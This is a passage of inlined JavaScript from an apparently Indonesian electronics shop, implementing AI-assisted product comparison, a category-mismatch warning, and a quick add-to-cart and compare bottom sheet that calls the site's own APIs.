  async function startAIAnalysis() {
    if (compareList.length < 2) {
      showToast('Minimal 2 produk diperlukan untuk analisis AI', 'warning');
      return;
    }
    
    if (isAnalyzing) return;
    
    // Send Google Analytics event for AI Analysis start
    if (typeof gtag === 'function') {
      gtag('event', 'ai_analysis_start', {
        event_category: 'Product Compare',
        event_label: 'AI Analysis Button Click',
        products_count: compareList.length,
        product_ids: compareList.map(p => p.id).join(','),
        custom_map: {
          custom_parameter_1: 'compare_ai_analysis'
        }
      });
    }
    
    // Check if products are in similar categories
    const mismatchInfo = await checkProductCategoryMismatch();
    if (mismatchInfo.shouldWarn) {
      const categoryList = Array.from(mismatchInfo.categories).join(', ');
      const confirmed = await showConfirmModal({
        title: 'Produk Berbeda Kategori',
        message: `Produk yang Anda pilih berasal dari kategori yang berbeda: ${categoryList}. AI tetap bisa menganalisis, tapi perbandingan mungkin kurang relevan. Lanjutkan analisis?`,
        confirmText: 'Ya, Analisis Tetap',
        cancelText: 'Batal',
        type: 'warning'
      });
      
      if (!confirmed) return;
    }
    
    openModal();
    showLoadingState();
    isAnalyzing = true;
    
    try {
      const response = await fetch('/api/compare/ai-analysis.php', {
        method: 'POST',
        credentials: 'same-origin'
      });
      
      const result = await response.json();
      
      if (!result.success) {
        throw new Error(result.error || 'Analisis AI gagal');
      }
      
      currentAnalysis = result;
      showAnalysisResults(result);
      
      // Send Google Analytics event for successful AI Analysis
      if (typeof gtag === 'function') {
        gtag('event', 'ai_analysis_success', {
          event_category: 'Product Compare',
          event_label: 'AI Analysis Completed',
          products_count: compareList.length,
          analysis_type: 'product_comparison',
          custom_map: {
            custom_parameter_1: 'compare_ai_success'
          }
        });
      }
      
    } catch (error) {
      showErrorState(error.message);
      
      // Send Google Analytics event for failed AI Analysis
      if (typeof gtag === 'function') {
        gtag('event', 'ai_analysis_error', {
          event_category: 'Product Compare',
          event_label: 'AI Analysis Failed',
          products_count: compareList.length,
          error_message: error.message,
          custom_map: {
            custom_parameter_1: 'compare_ai_error'
          }
        });
      }
    } finally {
      isAnalyzing = false;
    }
  }
  
  /**
   * Show modal
   */
  function openModal() {
    if (!compareModal) return;
    compareModal.classList.add('open');
    document.body.style.overflow = 'hidden';
  }
  
  /**
   * Close modal
   */
  function closeModal() {
    if (!compareModal) return;
    compareModal.classList.remove('open');
    document.body.style.overflow = '';
  }
  
  /**
   * Show loading state
   */
  function showLoadingState() {
    const loading = document.getElementById('aiLoading');
    const error = document.getElementById('aiError');
    const results = document.getElementById('aiResults');
    
    if (loading) loading.style.display = 'block';
    if (error) error.hidden = true;
    if (results) results.hidden = true;
  }
  
  /**
   * Show error state
   */
  function showErrorState(message) {
    const loading = document.getElementById('aiLoading');
    const error = document.getElementById('aiError');
    const results = document.getElementById('aiResults');
    const errorMessage = document.getElementById('aiErrorMessage');
    
    if (loading) loading.style.display = 'none';
    if (error) error.hidden = false;
    if (results) results.hidden = true;
    if (errorMessage) errorMessage.textContent = message;
  }
  
  /**
   * Show analysis results
   */
  function showAnalysisResults(analysis) {
    const loading = document.getElementById('aiLoading');
    const error = document.getElementById('aiError');
    const results = document.getElementById('aiResults');
    
    if (loading) loading.style.display = 'none';
    if (error) error.hidden = true;
    if (results) results.hidden = false;
    
    const data = analysis.data;
    
    // Update summary
    const summaryElement = document.getElementById('aiSummary');
    if (summaryElement) summaryElement.textContent = data.summary || '';
    
    const winnerProduct = document.getElementById('winnerProduct');
    const winnerReason = document.getElementById('winnerReason');
    if (winnerProduct && winnerReason && data.winner_overall) {
      const winner = compareList.find(p => parseInt(p.id) === parseInt(data.winner_overall));
      winnerProduct.textContent = winner ? winner.name : 'Tidak diketahui';
      winnerReason.textContent = data.winner_reason || '';
    }
    
    // Update comparison table
    updateComparisonTable(data.comparison_table);
    
    // Update detailed analysis
    updateDetailedAnalysis(data.detailed_analysis);
    
    // Update recommendations
    updateRecommendations(data.recommendations);
    
    // Update buying tips
    updateBuyingTips(data.buying_tips);
  }
  
  /**
   * Update comparison table
   */
  function updateComparisonTable(comparisonData) {
    const container = document.getElementById('comparisonTable');
    if (!container || !comparisonData?.categories) return;
    
    // First, create product header row with names
    const productHeaderHtml = `
      <div class="comparison-category">
        <div class="category-header">Produk</div>
        <div class="category-products">
          ${compareList.map(product => `
            <div class="product-score">
              <div class="product-name-header">
                <strong>${escapeHtml(product.name)}</strong>
              </div>
              <div class="product-price">
                ${formatPrice(product.price)}
              </div>
            </div>
          `).join('')}
        </div>
      </div>
    `;
    
    // Then create comparison categories
    const categoriesHtml = comparisonData.categories.map(category => `
      <div class="comparison-category">
        <div class="category-header">${escapeHtml(category.name)}</div>
        <div class="category-products">
          ${compareList.map(product => {
            const productData = category.products?.[product.id];
            return `
              <div class="product-score">
                <div class="score-value">
                  <span class="score-stars">${'â˜…'.repeat(productData?.score || 0)}${'â˜†'.repeat(5 - (productData?.score || 0))}</span>
                  <span>${productData?.score || 0}/5</span>
                </div>
                <div class="score-note">${escapeHtml(productData?.note || '')}</div>
              </div>
            `;
          }).join('')}
        </div>
      </div>
    `).join('');
    
    container.innerHTML = productHeaderHtml + categoriesHtml;
  }
  
  /**
   * Update detailed analysis
   */
  function updateDetailedAnalysis(analysisData) {
    const container = document.getElementById('detailedAnalysis');
    if (!container || !analysisData) return;
    
    container.innerHTML = compareList.map(product => {
      const productAnalysis = analysisData[product.id];
      if (!productAnalysis) return '';
      
      // Use product name from API response if available, fallback to local name
      const productName = productAnalysis.product_name || product.name;
      
      return `
        <div class="product-analysis">
          <h5>${escapeHtml(productName)}</h5>
          
          ${productAnalysis.strengths ? `
            <div class="analysis-section">
              <h6 class="strengths">âœ… Kelebihan</h6>
              <ul>
                ${productAnalysis.strengths.map(strength => 
                  `<li>${escapeHtml(strength)}</li>`
                ).join('')}
              </ul>
            </div>
          ` : ''}
          
          ${productAnalysis.weaknesses ? `
            <div class="analysis-section">
              <h6 class="weaknesses">âŒ Kekurangan</h6>
              <ul>
                ${productAnalysis.weaknesses.map(weakness => 
                  `<li>${escapeHtml(weakness)}</li>`
                ).join('')}
              </ul>
            </div>
          ` : ''}
          
          ${productAnalysis.best_for ? `
            <div class="analysis-section">
              <h6 class="best-for">ðŸŽ¯ Cocok Untuk</h6>
              <p class="best-for-text">${escapeHtml(productAnalysis.best_for)}</p>
            </div>
          ` : ''}
        </div>
      `;
    }).filter(Boolean).join('');
  }
  
  /**
   * Update recommendations
   */
  function updateRecommendations(recommendations) {
    if (!recommendations) return;
    
    const budgetEl = document.getElementById('budgetRecommendation');
    const performanceEl = document.getElementById('performanceRecommendation');
    const balancedEl = document.getElementById('balancedRecommendation');
    
    if (budgetEl && recommendations.budget_conscious) {
      const product = compareList.find(p => parseInt(p.id) === parseInt(recommendations.budget_conscious));
      budgetEl.textContent = product ? product.name : 'Tidak tersedia';
    }
    
    if (performanceEl && recommendations.performance_focused) {
      const product = compareList.find(p => parseInt(p.id) === parseInt(recommendations.performance_focused));
      performanceEl.textContent = product ? product.name : 'Tidak tersedia';
    }
    
    if (balancedEl && recommendations.balanced) {
      const product = compareList.find(p => parseInt(p.id) === parseInt(recommendations.balanced));
      balancedEl.textContent = product ? product.name : 'Tidak tersedia';
    }
  }
  
  /**
   * Check if products are from different categories
   */
  async function checkProductCategoryMismatch() {
    if (compareList.length < 2) {
      return { shouldWarn: false, categories: new Set() };
    }
    
    // Get the root categories from each product
    const rootCategories = new Set();
    const productCategories = [];
    
    for (const product of compareList) {
      // Extract root category from the product's category_path if available
      const rootCategory = await getProductRootCategory(product);
      if (rootCategory) {
        rootCategories.add(rootCategory);
        productCategories.push({
          product: product.name,
          category: rootCategory
        });
      }
    }
    
    // If we have more than 1 different root categories, show warning
    const shouldWarn = rootCategories.size > 1 && compareList.length >= 2;
    
    return {
      shouldWarn: shouldWarn,
      categories: rootCategories,
      productCategories: productCategories
    };
  }
  
  /**
   * Get product root category from category_path or fallback to name detection
   */
  async function getProductRootCategory(product) {
    // First try to get from category_path if available
    if (product.category_path) {
      const rootCategory = product.category_path.split('/')[0];
      return rootCategory;
    }
    
    // If no category_path, try to fetch from product detail or use name detection
    const detectedCategory = detectProductCategory(product.name);
    return detectedCategory;
  }

  /**
   * Detect product category from name (fallback method)
   */
  function detectProductCategory(productName) {
    const name = productName.toLowerCase();
    
    // Map keywords to actual root categories from the API structure
    const categoryMappings = {
      // Komputer & Laptop
      'Komputer & Laptop': ['laptop', 'notebook', 'macbook', 'thinkpad', 'gaming laptop', 'desktop', 'pc', 'mini pc', 'all-in-one', 'server'],
      
      // Printer & Scanner  
      'Printer & Scanner': ['printer', 'epson printer', 'canon printer', 'hp printer', 'brother printer', 'scanner', 'laser printer', 'inkjet', 'dot matrix'],
      
      // Gadget
      'Gadget': ['smartphone', 'iphone', 'samsung phone', 'xiaomi', 'oppo', 'vivo', 'realme', 'tablet', 'ipad', 'android tablet'],
      
      // Periferal
      'Periferal': ['monitor', 'lcd monitor', 'led monitor', 'gaming monitor', 'keyboard', 'mouse', 'gaming keyboard', 'mechanical keyboard', 'webcam'],
      
      // Audio
      'Audio': ['headset', 'headphone', 'earphone', 'gaming headset', 'speaker', 'mikrofon', 'sound card'],
      
      // Jaringan
      'Jaringan': ['router', 'wifi', 'access point', 'switch', 'modem', 'network'],
      
      // Penyimpanan
      'Penyimpanan': ['ssd', 'hdd', 'nvme', 'solid state', 'hard disk', 'flash drive', 'usb drive', 'memory card'],
      
      // Komponen PC
      'Komponen PC': ['ram', 'memory', 'ddr4', 'ddr5', 'processor', 'cpu', 'intel', 'amd', 'motherboard', 'graphics card', 'gpu', 'psu', 'power supply', 'casing'],
      
      // UPS & Power
      'UPS & Power': ['ups', 'uninterruptible', 'stabilizer', 'power supply'],
      
      // Proyektor
      'Proyektor': ['proyektor', 'projector', 'layar proyektor'],
      
      // Security System
      'Security System': ['cctv', 'security camera', 'surveillance'],
      
      // Aksesoris
      'Aksesoris': ['charger laptop', 'adaptor', 'converter', 'dock', 'hub', 'kabel', 'cable', 'power bank', 'tas laptop'],
      
      // Software
      'Software': ['software', 'lisensi', 'license', 'antivirus'],
      
      // Perlengkapan Kantor
      'Perlengkapan Kantor': ['fingerprint', 'finger print', 'atk', 'alat tulis']
    };
    
    // Check which root category matches
    for (const [rootCategory, keywords] of Object.entries(categoryMappings)) {
      for (const keyword of keywords) {
        if (name.includes(keyword)) {
          return rootCategory;
        }
      }
    }
    
    return null;
  }

  /**
   * Update buying tips
   */
  function updateBuyingTips(tips) {
    const container = document.getElementById('buyingTips');
    if (!container || !Array.isArray(tips)) return;
    
    container.innerHTML = tips.map(tip => 
      `<li>${escapeHtml(tip)}</li>`
    ).join('');
  }
  
  // Removed share and cart functions - replaced with AI disclaimer in UI
  
  /**
   * Remove product from compare (public method)
   */
  async function removeProduct(productId) {
    try {
      await removeFromCompare(productId);
      showToast('Produk dihapus dari perbandingan', 'success');
      
      // Update all compare buttons
      updateAllCompareButtons();
      
    } catch (error) {
      showToast(error.message || 'Terjadi kesalahan', 'error');
    }
  }
  
  /**
   * Utility functions
   */
  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
  
  function formatPrice(price) {
    return 'Rp ' + parseInt(price).toLocaleString('id-ID');
  }
  
  /**
   * Show confirmation modal using the existing modal.css design
   */
  function showConfirmModal(options = {}) {
    return new Promise((resolve) => {
      const {
        title = 'Konfirmasi',
        message = 'Apakah Anda yakin?',
        confirmText = 'Ya',
        cancelText = 'Tidak',
        type = 'warning'
      } = options;
      
      // Create modal HTML
      const modalHTML = `
        <div class="modal-overlay" id="confirmModal">
          <div class="modal-dialog">
            <div class="modal-header">
              <h3 class="modal-title">
                <div class="modal-icon ${type}">
                  ${getModalIcon(type)}
                </div>
                ${escapeHtml(title)}
              </h3>
            </div>
            <div class="modal-body">
              <p class="modal-message">${escapeHtml(message)}</p>
              <div class="modal-actions">
                <button type="button" class="modal-btn modal-btn-secondary" id="confirmCancel">
                  ${escapeHtml(cancelText)}
                </button>
                <button type="button" class="modal-btn modal-btn-${type === 'danger' ? 'danger' : 'primary'}" id="confirmOk">
                  ${escapeHtml(confirmText)}
                </button>
              </div>
            </div>
          </div>
        </div>
      `;
      
      // Add to DOM
      document.body.insertAdjacentHTML('beforeend', modalHTML);
      const modal = document.getElementById('confirmModal');
      const cancelBtn = document.getElementById('confirmCancel');
      const okBtn = document.getElementById('confirmOk');
      
      // Show modal
      requestAnimationFrame(() => {
        modal.classList.add('show');
      });
      
      // Handle events
      function cleanup() {
        modal.remove();
      }
      
      function handleCancel() {
        modal.classList.remove('show');
        setTimeout(() => {
          cleanup();
          resolve(false);
        }, 200);
      }
      
      function handleConfirm() {
        modal.classList.remove('show');
        setTimeout(() => {
          cleanup();
          resolve(true);
        }, 200);
      }
      
      cancelBtn.addEventListener('click', handleCancel);
      okBtn.addEventListener('click', handleConfirm);
      
      // Close on overlay click
      modal.addEventListener('click', (e) => {
        if (e.target === modal) {
          handleCancel();
        }
      });
      
      // Close on escape
      document.addEventListener('keydown', function escapeHandler(e) {
        if (e.key === 'Escape') {
          document.removeEventListener('keydown', escapeHandler);
          handleCancel();
        }
      });
      
      // Focus on confirm button
      setTimeout(() => okBtn.focus(), 100);
    });
  }
  
  /**
   * Get icon for modal type
   */
  function getModalIcon(type) {
      const icons = {
        danger: 'ðŸš¨ ',
        warning: 'âš ï¸',
        success: 'âœ…',
        info: 'â„¹ï¸'
      };
      return icons[type] || icons.info;
    }


  function showToast(message, type = 'info') {
    // Integration with existing toast system or create simple one
    
    // Simple alert fallback - replace with proper toast system
    if (type === 'error') {
      alert('Error: ' + message);
    }
  }
  
  // Inline compare preview functions removed - keeping it simple and clean
  
  /**
   * Get current product ID from page
   */
  function getCurrentProductId() {
    const button = document.getElementById('pd-compare-btn');
    return button ? parseInt(button.dataset.productId) : null;
  }
  
  // hideStickyCompareBar function removed - no longer using sticky bar

  // Public API
  window.productCompare = {
    removeProduct: removeProduct,
    addToCompare: addToCompare,
    loadCompareList: loadCompareList,
    getCompareList: function() { return compareList; },
    openSidebar: openCompareSidebar,
    startAnalysis: startAIAnalysis,
    // Helper function to add from external sources with variant support
    addProductWithVariant: async function(productId, variantId = 0) {
      return await addToCompare(productId, variantId);
    }
  };

})();



</script>
<script data-inlined="product-card-actions.js">
/**
 * Product Card Quick Actions
 * Bottom sheet menu for quick add to cart & compare
 * Integrates with existing product-compare.js and cart.js
 */

(function() {
  'use strict';
  
  let activeSheet = null;
  let activeProductData = null;
  
  // DOM elements (will be created dynamically)
  let overlay = null;
  let bottomSheet = null;
  
  /**
   * Initialize on DOM ready
   */
  document.addEventListener('DOMContentLoaded', function() {
    createBottomSheet();
    attachEventListeners();
  });
  
  /**
   * Create bottom sheet HTML structure
   */
  function createBottomSheet() {
    // Create overlay
    overlay = document.createElement('div');
    overlay.className = 'pca-overlay';
    overlay.addEventListener('click', closeBottomSheet);
    
    // Create bottom sheet
    bottomSheet = document.createElement('div');
    bottomSheet.className = 'pca-bottom-sheet';
    bottomSheet.innerHTML = `
      <div class="pca-sheet-handle"></div>
      <div class="pca-sheet-product" id="pca-product-preview">
        <!-- Product info will be inserted here -->
      </div>
      <div class="pca-sheet-actions">
        <button type="button" class="pca-action-item cart" id="pca-add-cart">
          <svg class="pca-action-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M17,18A2,2 0 0,1 19,20A2,2 0 0,1 17,22C15.89,22 15,21.1 15,20C15,18.89 15.89,18 17,18M1,2H4.27L5.21,4H20A1,1 0 0,1 21,5C21,5.17 20.95,5.34 20.88,5.5L17.3,11.97C16.96,12.58 16.3,13 15.55,13H8.1L7.2,14.63L7.17,14.75A0.25,0.25 0 0,0 7.42,15H19V17H7C5.89,17 5,16.1 5,15C5,14.65 5.09,14.32 5.24,14.04L6.6,11.59L3,4H1V2M7,18A2,2 0 0,1 9,20A2,2 0 0,1 7,22C5.89,22 5,21.1 5,20C5,18.89 5.89,18 7,18M16,11L18.78,6H6.14L8.5,11H16Z"/>
          </svg>
          <div class="pca-action-content">
            <div class="pca-action-label">Tambah ke Keranjang</div>
            <div class="pca-action-desc">Lanjut belanja produk lain</div>
          </div>
        </button>
        
        <button type="button" class="pca-action-item compare" id="pca-add-compare">
          <svg class="pca-action-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M21,9L17,5V8H10V10H17V13M7,11L3,15L7,19V16H14V14H7V11Z"/>
          </svg>
          <div class="pca-action-content">
            <div class="pca-action-label">Bandingkan Produk</div>
            <div class="pca-action-desc">Analisis dengan AI</div>
          </div>
          <span class="pca-action-badge compare" id="pca-compare-count" style="display:none;">0</span>
        </button>
      </div>
    `;
    
    // Append to body
    document.body.appendChild(overlay);
    document.body.appendChild(bottomSheet);
    
    // Setup action buttons
    document.getElementById('pca-add-cart').addEventListener('click', handleAddToCart);
    document.getElementById('pca-add-compare').addEventListener('click', handleAddToCompare);
    
    // Prevent clicks inside bottom sheet from closing it
    bottomSheet.addEventListener('click', function(e) {
      e.stopPropagation();
    });
  }
  
  /**
   * Attach event listeners to all 3-dot buttons
   */
  function attachEventListeners() {
    // Use event delegation for dynamically loaded product cards
    document.addEventListener('click', function(e) {
      const btn = e.target.closest('.prod-card-actions-btn');
      if (btn) {
        e.preventDefault();
        e.stopPropagation();
        handleActionsButtonClick(btn);
      }
    });
    
    // Handle ESC key
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape' && activeSheet) {
        closeBottomSheet();
      }
    });
  }
  
  /**
   * Handle 3-dot button click
   */
  function handleActionsButtonClick(button) {
    // Get product ID directly from button
    const productId = parseInt(button.dataset.productId) || 0;
    if (!productId) {
      console.error('Product ID not found on button:', button);
      showToast('Data produk tidak ditemukan', 'error');
      return;
    }
    
    // Find parent card for additional data
    const card = button.closest('.prod-card, .pa-card');
    if (!card) {
      console.error('Product card not found');
      showToast('Data produk tidak ditemukan', 'error');
      return;
    }
    
    // Extract product data from card
    const productData = extractProductData(card, productId);
    if (!productData) {
      showToast('Data produk tidak ditemukan', 'error');
      return;
    }
    
    activeProductData = productData;
    openBottomSheet(productData);
  }
  
  /**
   * Extract product data from card element
   */
  function extractProductData(card, productId) {
    try {
      // Product ID already passed from button
      if (!productId) {
        console.error('Product ID not provided');
        return null;
      }
      // Product ID already passed from button
      if (!productId) {
        console.error('Product ID not provided');
        return null;
      }
      
      const id = productId;
      
      // Get product name
      const nameEl = card.querySelector('.prod-name, .title');
      const name = nameEl ? nameEl.textContent.trim() : 'Produk';
      
      // Get product image
      const imgEl = card.querySelector('.thumb img, img');
      const image = imgEl ? imgEl.src : '/assets/img/placeholder.png';
      
      // Get product price and detect variants
      const priceEl = card.querySelector('.prod-price-final, .final, .prod-price');
      let price = 0;
      let hasVariants = false;
      let priceDisplay = '';
      
      if (priceEl) {
        // Get text content and clean it
        let priceText = priceEl.textContent.trim();
        priceDisplay = priceText;
        
        // Check if it's a range (indicates product has variants)
        if (priceText.includes('-')) {
          hasVariants = true;
          // Take the first price for calculation
          priceText = priceText.split('-')[0].trim();
        }
        
        // Remove all non-numeric characters
        priceText = priceText.replace(/[^0-9]/g, '');
        price = parseInt(priceText) || 0;
      }
      
      // Get stock status
      const stockDot = card.querySelector('.stock-dot');
      let stockStatus = 'unknown';
      let stockLabel = 'Cek stok';
      
      if (stockDot) {
        if (stockDot.classList.contains('ready')) {
          stockStatus = 'in';
          stockLabel = 'Stok tersedia';
        } else if (stockDot.classList.contains('low')) {
          stockStatus = 'low';
          stockLabel = 'Stok terbatas';
        } else if (stockDot.classList.contains('out')) {
          stockStatus = 'out';
          stockLabel = 'Stok habis';
        }
      }
      
      // Get category path (if available)
      const categoryPath = card.dataset.category || '';
      
      // Get URL
      let url = '#';
      if (card.tagName === 'A') {
        url = card.href;
      } else {
        const link = card.querySelector('a[href*="/product/"]');
        if (link) url = link.href;
      }
      
      return {
        id: id,
        name: name,
        image: image,
        price: price,
        priceDisplay: priceDisplay,
        hasVariants: hasVariants,
        stockStatus: stockStatus,
        stockLabel: stockLabel,
        categoryPath: categoryPath,
        url: url
      };
    } catch (error) {
      console.error('Error extracting product data:', error);
      return null;
    }
  }
  
  /**
   * Open bottom sheet
   */
  function openBottomSheet(productData) {
    if (!overlay || !bottomSheet) return;
    
    // Update product preview
    updateProductPreview(productData);
    
    // Update cart button based on variant status
    updateCartButtonForVariant(productData);
    
    // Update compare button state
    updateCompareButtonState(productData.id);
    
    // Show overlay and sheet
    overlay.classList.add('active');
    bottomSheet.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    activeSheet = true;
    
    // Google Analytics
    if (typeof gtag === 'function') {
      gtag('event', 'quick_actions_open', {
        event_category: 'Product Card',
        event_label: 'Quick Actions Menu Opened',
        product_id: productData.id,
        product_name: productData.name
      });
    }
  }
  
  /**
   * Close bottom sheet
   */
  function closeBottomSheet() {
    if (!overlay || !bottomSheet) return;
    
    overlay.classList.remove('active');
    bottomSheet.classList.remove('active');
    document.body.style.overflow = '';
    
    activeSheet = false;
    activeProductData = null;
  }
  
  /**
   * Update product preview in bottom sheet
   */
  function updateProductPreview(productData) {
    const preview = document.getElementById('pca-product-preview');
    if (!preview) return;
    
    // Use full price display (shows range for variants)
    const priceDisplay = productData.priceDisplay || formatPrice(productData.price);
    
    preview.innerHTML = `
      <img src="${escapeHtml(productData.image)}" 
           alt="${escapeHtml(productData.name)}" 
           class="pca-product-image"
           loading="lazy">
      <div class="pca-product-info">
        <h4 class="pca-product-name">${escapeHtml(productData.name)}</h4>
        <p class="pca-product-price">${escapeHtml(priceDisplay)}</p>
        <p class="pca-product-stock ${productData.stockStatus}">${productData.stockLabel}</p>
      </div>
    `;
  }
  
  /**
   * Update cart button for variant products
   */
  function updateCartButtonForVariant(productData) {
    const cartBtn = document.getElementById('pca-add-cart');
    if (!cartBtn) return;
    
    if (productData.hasVariants) {
      // Product has variants - change to "View Detail"
      cartBtn.dataset.hasVariants = 'true';
      cartBtn.dataset.productUrl = productData.url;
      
      // Update icon to eye/external
      const iconSvg = cartBtn.querySelector('svg');
      if (iconSvg) {
        iconSvg.innerHTML = '<path d="M12,9A3,3 0 0,0 9,12A3,3 0 0,0 12,15A3,3 0 0,0 15,12A3,3 0 0,0 12,9M12,17A5,5 0 0,1 7,12A5,5 0 0,1 12,7A5,5 0 0,1 17,12A5,5 0 0,1 12,17M12,4.5C7,4.5 2.73,7.61 1,12C2.73,16.39 7,19.5 12,19.5C17,19.5 21.27,16.39 23,12C21.27,7.61 17,4.5 12,4.5Z"/>';
      }
      
      // Update text
      const label = cartBtn.querySelector('.pca-action-label');
      const desc = cartBtn.querySelector('.pca-action-desc');
      if (label) label.textContent = 'Lihat Detail Produk';
      if (desc) desc.textContent = 'Pilih varian terlebih dahulu';
      
    } else {
      // Single product - normal cart button
      cartBtn.dataset.hasVariants = 'false';
      
      // Restore cart icon
      const iconSvg = cartBtn.querySelector('svg');
      if (iconSvg) {
        iconSvg.innerHTML = '<path d="M17,18A2,2 0 0,1 19,20A2,2 0 0,1 17,22C15.89,22 15,21.1 15,20C15,18.89 15.89,18 17,18M1,2H4.27L5.21,4H20A1,1 0 0,1 21,5C21,5.17 20.95,5.34 20.88,5.5L17.3,11.97C16.96,12.58 16.3,13 15.55,13H8.1L7.2,14.63L7.17,14.75A0.25,0.25 0 0,0 7.42,15H19V17H7C5.89,17 5,16.1 5,15C5,14.65 5.09,14.32 5.24,14.04L6.6,11.59L3,4H1V2M7,18A2,2 0 0,1 9,20A2,2 0 0,1 7,22C5.89,22 5,21.1 5,20C5,18.89 5.89,18 7,18M16,11L18.78,6H6.14L8.5,11H16Z"/>';
      }
      
      // Restore text
      const label = cartBtn.querySelector('.pca-action-label');
      const desc = cartBtn.querySelector('.pca-action-desc');
      if (label) label.textContent = 'Tambah ke Keranjang';
      if (desc) desc.textContent = 'Lanjut belanja produk lain';
    }
  }
  
  /**
   * Update compare button state
   */
  function updateCompareButtonState(productId) {
    const compareBtn = document.getElementById('pca-add-compare');
    const compareBadge = document.getElementById('pca-compare-count');
    
    if (!compareBtn) return;
    
    // Check if product is in compare list (using global compareList if available)
    let isInCompare = false;
    let compareCount = 0;
    
    // Try to get compare list from product-compare.js via window.productCompare
    if (typeof window.productCompare !== 'undefined' && typeof window.productCompare.getCompareList === 'function') {
      const compareList = window.productCompare.getCompareList();
      compareCount = compareList.length;
      isInCompare = compareList.some(p => parseInt(p.id) === parseInt(productId));
    } else {
      // Fallback: check badge count
      const mainBadge = document.getElementById('compareCount');
      if (mainBadge) {
        compareCount = parseInt(mainBadge.textContent) || 0;
      }
    }
    
    // Update button state
    if (isInCompare) {
      compareBtn.classList.add('active');
      compareBtn.querySelector('.pca-action-label').textContent = 'Hapus dari Perbandingan';
      compareBtn.querySelector('.pca-action-desc').textContent = 'Sudah ada di daftar';
    } else {
      compareBtn.classList.remove('active');
      compareBtn.querySelector('.pca-action-label').textContent = 'Bandingkan Produk';
      compareBtn.querySelector('.pca-action-desc').textContent = 'Analisis dengan AI';
    }
    
    // Update badge
    if (compareBadge && compareCount > 0) {
      compareBadge.textContent = compareCount;
      compareBadge.style.display = 'inline-flex';
    } else if (compareBadge) {
      compareBadge.style.display = 'none';
    }
  }
  
  /**
   * Handle add to cart
   */
  async function handleAddToCart() {
    if (!activeProductData) return;
    
    const button = document.getElementById('pca-add-cart');
    if (!button) return;
    
    // If product has variants, redirect to detail page
    if (activeProductData.hasVariants) {
      window.location.href = activeProductData.url;
      return;
    }
    
    // Check stock
    if (activeProductData.stockStatus === 'out') {
      showToast('Produk sedang habis', 'warning');
      return;
    }
    
    // Show loading state
    button.classList.add('loading');
    button.disabled = true;
    
    // CSRF Token Helper
    function getCsrfToken() {
      return document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';
    }
    
    try {
      // Call cart API with proper format
      const response = await fetch('/api/cart/add.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': getCsrfToken()
        },
        body: JSON.stringify({
          csrf_token: getCsrfToken(),
          product_id: activeProductData.id,
          qty: 1, // Use 'qty' not 'quantity'
          variant_id: 0, // Default variant
          meta: {
            name: activeProductData.name,
            image_url: activeProductData.image
          }
        }),
        credentials: 'same-origin'
      });
      
      const result = await response.json();
      
      // Check both response status and result.ok
      if (!response.ok || !result.ok) {
        throw new Error(result.error || result.message || 'Gagal menambahkan ke keranjang');
      }
      
      // Success animation
      button.classList.remove('loading');
      button.classList.add('success');
      
      // Update cart badge
      updateCartBadge();

      // PlazaAnalytics tracking
      if (window.PlazaAnalytics) {
        const _slug = (activeProductData.url || '').replace(/.*\/product\//, '');
        window.PlazaAnalytics.track('add_to_cart', { slug: _slug });
      }

      // Show success toast
      showToast('Produk ditambahkan ke keranjang', 'success');
      
      // Google Analytics
      if (typeof gtag === 'function') {
        gtag('event', 'add_to_cart', {
          event_category: 'Ecommerce',
          event_label: 'Quick Add to Cart',
          items: [{
            item_id: activeProductData.id,
            item_name: activeProductData.name,
            price: activeProductData.price,
            quantity: 1
          }]
        });
      }
      
      // Close sheet after short delay
      setTimeout(() => {
        closeBottomSheet();
        button.classList.remove('success');
        button.disabled = false;
      }, 1000);
      
    } catch (error) {
      console.error('Add to cart error:', error);
      button.classList.remove('loading');
      button.disabled = false;
      showToast(error.message || 'Terjadi kesalahan', 'error');
    }
  }
  
  /**
   * Handle add to compare
   */
  async function handleAddToCompare() {
    if (!activeProductData) return;
    
    const button = document.getElementById('pca-add-compare');
    if (!button) return;
    
    // Check if already in compare
    const isActive = button.classList.contains('active');
    
    // Check 5-product limit before adding
    if (!isActive) {
      const mainBadge = document.getElementById('compareCount');
      const currentCount = mainBadge ? parseInt(mainBadge.textContent) || 0 : 0;
      
      if (currentCount >= 5) {
        showToast('Maksimal 5 produk untuk perbandingan', 'warning');
        return;
      }
    }
    
    // Show loading state
    button.classList.add('loading');
    button.disabled = true;
    
    try {
      if (isActive) {
        // Remove from compare
        await removeFromCompare(activeProductData.id);
        showToast('Produk dihapus dari perbandingan', 'success');
      } else {
        // Add to compare
        await addToCompare(activeProductData.id);
        showToast('Produk ditambahkan ke perbandingan', 'success');
        
        // Trigger fly animation
        triggerFlyToCompareAnimation();
      }
      
      // Success animation
      button.classList.remove('loading');
      button.classList.add('success');
      
      // Update compare button state
      updateCompareButtonState(activeProductData.id);
      
      // Close sheet after short delay
      setTimeout(() => {
        closeBottomSheet();
        button.classList.remove('success');
        button.disabled = false;
      }, 800);
      
    } catch (error) {
      console.error('Compare error:', error);
      button.classList.remove('loading');
      button.disabled = false;
      showToast(error.message || 'Terjadi kesalahan', 'error');
    }
  }
  
  /**
   * Add to compare (calls existing API)
   */
  async function addToCompare(productId) {
    const response = await fetch('/api/compare/add.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        product_id: productId,
        variant_id: 0
      }),
      credentials: 'same-origin'
    });
    
    const result = await response.json();
    
    if (!result.success) {
      throw new Error(result.error || 'Gagal menambahkan produk');
    }
    
    // Trigger compare list reload if function exists
    if (typeof window.productCompare !== 'undefined' && typeof window.productCompare.loadCompareList === 'function') {
      await window.productCompare.loadCompareList();
    }
    
    return result;
  }
  
  /**
   * Remove from compare (calls existing API)
   */
  async function removeFromCompare(productId) {
    const response = await fetch('/api/compare/remove.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        product_id: productId
      }),
      credentials: 'same-origin'
    });
    
    const result = await response.json();
    
    if (!result.success) {
      throw new Error(result.error || 'Gagal menghapus produk');
    }
    
    // Trigger compare list reload if function exists
    if (typeof window.productCompare !== 'undefined' && typeof window.productCompare.loadCompareList === 'function') {
      await window.productCompare.loadCompareList();
    }
    
    return result;
  }
  
  /**
